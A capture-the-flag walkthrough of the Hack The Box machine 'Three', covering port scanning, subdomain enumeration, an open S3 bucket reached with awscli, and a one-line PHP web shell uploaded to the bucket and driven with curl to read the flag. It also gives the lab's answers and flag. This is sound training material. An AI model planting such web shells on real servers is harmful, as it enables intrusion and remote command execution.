---
layout: default
title: Hack The Box Three
description: Walkthorugh/Writeup for Three, a Starting Point Hack The Box machine about AWS S3 buckets, PHP web shells and directory/subdomain enumeration 
set: Starting Point
subset: Tier 1 - Fundamental Exploitation
order: 5
---

# [Three](https://app.hackthebox.com/machines/Three)<!-- omit in toc -->

This Starting Point machine revolves entirely around [AWS S3 buckets](https://aws.amazon.com/s3/), PHP web shells and directory/subdomain enumeration.

### Table of contents:
- [Task 1](#task-1)
- [Task 2](#task-2)
- [Task 3](#task-3)
- [Task 4](#task-4)
- [Task 5](#task-5)
- [Task 6](#task-6)
- [Task 7](#task-7)
- [Task 8](#task-8)
- [Task 9](#task-9)
- [Submit Flag](#submit-flag)

## Task 1

*How many TCP ports are open?*

To answer this question we need to run a thorough [nmap](https://nmap.org/) scan on all [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) ports like this: `nmap target-ip-here -p- -T 5`

`-p-` means that [all 65535 TCP ports](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers) are going to be scanned. You can speed up this process with `-T 5` which will [scan faster](https://nmap.org/book/performance-timing-templates.html).

```
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

This means that there are 

>2

open TCP ports on this machine.

## Task 2

*What is the domain of the email address provided in the "Contact" section of the website?*

Let's paste the machine's ip in our address bar and head to the `#/contact` page. Here we'll see

![email]({{ site.baseurl }}/assets/images/htb/three/email.png)

This means that the domain of the email address is

>thetoppers.htb

## Task 3

*In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?*

We learned about the 

> `/etc/hosts`

file in the [Responder](https://frncscrlnd.github.io/writeups/hackthebox/Responder) machine. This file enables users to use local address resolution by typing the IP address and respective hostname manually. Let's put `thetoppers.htb` in our `hosts` file:

`sudo nano /etc/hosts`

then paste

`target-ip-here thetoppers.htb` 

## Task 4

*Which sub-domain is discovered during further enumeration?*

Back in the [Appointment](https://frncscrlnd.github.io/writeups/hackthebox/Appointment) machine we laearned that [gobuster](https://github.com/OJ/gobuster) is a subdomain/directory enumeration tool. We know that `dir` is the flag used to specify directory enumeration and, according to the [docs](https://github.com/OJ/gobuster), in order to enumerate subdomains, we need to use

```
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
```

`vhost` specifies that we are enumerating [virtual hosts](https://en.wikipedia.org/wiki/Virtual_hosting) on this machine (`x.thetoppers.htb`). This means that multiple websites are running on the same server (and thus on the same IP); different websites will be returned to the user based on the value of the `Host:` header, which is what the. [`seclists`](https://github.com/danielmiessler/SecLists) is a well-known collection of wordlists and [`--append-domain`](https://github.com/OJ/gobuster#:~:text=vhost,-%29) specifies that gobuster needs to append `.thetoppers.htb` to all requests (e.g. `merch.thetoppers.htb`).

Thiw will return

```
s3.thetoppers.htb Status: 404 [Size: 21]
```

This returns a 404 [HTTP status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status) (Not Found) because we need to also add this hostname to our `/etc/hosts` file with the same IP as `thetoppers.htb`. Once we add this hostname (like we did in [Task 3](#task-3)), we can visit `s3.thetoppers.htb` and it will return

```
{"status": "running"}
```

## Task 5

*Which service is running on the discovered sub-domain?*

Let's look [this](https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/getting-started-s3.html) up.

It's an

>Amazon S3

[bucket](https://aws.amazon.com/s3/), a cloud storage service for S3 Objects from [AWS](https://docs.aws.amazon.com/). 

## Task 6

*Which command line utility can be used to interact with the service running on the discovered sub-domain?*

We found out from the [docs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-bucket-intro.html#accessing-aws-cli) that we can interact with S£ via 

>`awscli`

a guide con be found [here](https://aws.amazon.com/cli/). We can install `awscli` with `sudo apt install awscli`

## Task 7

*Which command is used to set up the AWS CLI installation?*

From the same [guide](https://aws.amazon.com/cli/) we learn that 

>`aws configure`

is used to set up the AWS CLI installation. Running this will return these prompts:

```
AWS Access Key ID [None]: 
AWS Secret Access Key [None]: 
Default region name [None]: 
Default output format [None]: 
```

we'll fill all of these with `test` (or anything else you want) as we need to fill them for the installation to work.

## Task 8

*What is the command used by the above utility to list all of the S3 buckets?*

Again, from this [guide](https://aws.amazon.com/cli/) we learn that, just like in GNU/Linux distributions with `ls`, we can list [S3 buckets](https://docs.aws.amazon.com/AmazonS3/latest/userguide/GettingStartedS3CLI.html) with

>`aws s3 ls`

In our case, we need to specify our endpoint with a `--endpoint` flag like this:

`aws --endpoint=http://s3.thetoppers.htb s3 ls`

This will return

`thetoppers.htb`

Now we can append the S3 bucket name to our last command and list all objects in that bucket:

`aws --endpoint=http://s3.thetoppers.htb s3 ls thetoppers.htb`

Which will return

```
                           PRE images/
2026-04-20 14:45:04          0 .htaccess
2026-04-20 14:45:04      11952 index.php
```

## Task 9

*This server is configured to run files written in what web scripting language?*

Just like we did while solving the [Responder](https://frncscrlnd.github.io/writeups/hackthebox/Responder) machine, we can use [nmap](https://nmap.org/) and the `-sV` flag to [detect the service and the respective version running on a port](https://nmap.org/book/man-version-detection.html) like this: `nmap target-ip-here -sV`

This will return

```
Host is up (0.097s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http     Apache httpd 2.4.29 ((Ubuntu))
843/tcp   filtered unknown
1334/tcp  filtered writesrv
1812/tcp  filtered radius
2393/tcp  filtered ms-olap1
6689/tcp  filtered tsa
52673/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.90 seconds
```

This means that the web server runs files written in the

>PHP

programming language.

This also means that we can upload a PHP web shell inside the bucket. We'll use a PHP shell from [https://www.revshells.com/]:

```
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

Let's create a `shell.php` file on our machine: `nano shell.php`, then we'll copy it to the bucket with `cp`.

```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

This will return

```
upload: ./shell.php to s3://thetoppers.htb/shell.php 
```

To make sure we uploaded the PHP file, we can run

```
aws --endpoint=http://s3.thetoppers.htb s3 ls thetoppers.htb
```

again.

We can make sure this works by useing `curl`:

```
curl "http://thetoppers.htb/shell.php?cmd=ls"
```

If this returns

```
<pre>images
index.php
shell.php
</pre>            
```

That means it worked.

## Submit Flag

*Submit root flag*

As we saw from [Task 9](#task-9), nothing of value is in this directory. Let's see which directory we're in with 

```
curl "http://thetoppers.htb/shell.php?cmd=pwd"
```

This will return

```
<pre>/var/www/html
</pre> 
```

Let's see where the flag might be by looking inside the parent directory (we can chain a multiple commands/parameters with `+`):

```
curl "http://thetoppers.htb/shell.php?cmd=ls+.."
```

This will return

```
<pre>flag.txt
html
</pre>
```
Let's then read the flag with 

```
curl "http://thetoppers.htb/shell.php?cmd=cat+../flag.txt"
```

This will return

>`a980d99281a28d638ac68b9bf9453c2b`
